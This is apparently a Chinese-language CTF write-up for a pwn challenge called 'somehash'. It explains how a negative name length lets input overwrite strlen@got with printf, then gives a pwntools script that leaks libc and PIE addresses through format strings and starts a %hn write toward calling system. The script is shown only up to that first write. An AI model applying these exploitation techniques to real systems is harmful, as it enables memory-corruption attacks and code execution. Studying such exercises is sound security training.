思路

拿到题目之后 先放入ida 然后checksec

保护全开

然后ida，分析

发现这里对输入的 name length没有进行负数的判断

所以输入name的时候，输入负数的话 会向低地址进行复写

p_buf = 0x50c0
strlen@got = 0x5028

我们可以通过输入负数，然后通过p_buf 对strlen@got进行修改（这里还未对strlen进行调用） 修改为printf函数 然后在后续的函数调用的时候方便泄露地址

这里通过计算可得p_buf和stlen@got 中间的距离是 152 所以我们填的时候就可以直接输入-152 然后就可以通过

printf("name> ");
p_buf[n256] = read(0, p_buf, (unsigned __int16)n256);

from pwn import *

context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
context.log_level = "info"

elf = ELF("./somehash")
libc = ELF("./wtf_somehash.6", checksec=False)

env = {b"LD_PRELOAD": b"./wtf_somehash.6"}

strlen_got = elf.got["strlen"]
atoi_got = elf.got["atoi"]
trials_off = 0x5078
helper_off = 0x24CF
libc_leak_off = 0x29D90

io = process("./somehash", env=env)
# io = remote("39.96.193.120", 10002)

io.recvuntil(b"name length> ")
io.send(b"-152")
io.recvuntil(b"name> ")

# 先把 strlen@got 的低字节改成 printf@plt，然后在这里直接泄漏地址

name_payload = b"QQ%19$p.%23$p.%28$p.%45$pRR".ljust(0x80, b"A")
io.send(name_payload)

out = io.recvuntil(b"content> ").decode("latin-1", "ignore")
leak_text = out.split("QQ", 1)[1].split("RR", 1)[0]
leak19, s23, p28, code = [int(x, 16) for x in leak_text.split(".")]
base = code - 0x1180
libc_base = leak19 - libc_leak_off
system = libc_base + libc.sym["system"]
slot28 = s23 - 0xC8

log.success("base =====> %#x" % base)
log.success("libc =====> %#x" % libc_base)
log.success("system =====> %#x" % system)
log.success("slot28 =====> %#x" % slot28)
log.success("arg28 =====> %#x" % p28)

gdb.attach(io)

width = (slot28 & 0xFFFF) or 0x10000
io.sendline(f"%19${width}c%23$hn".encode())
io.recvuntil(b"content> ")
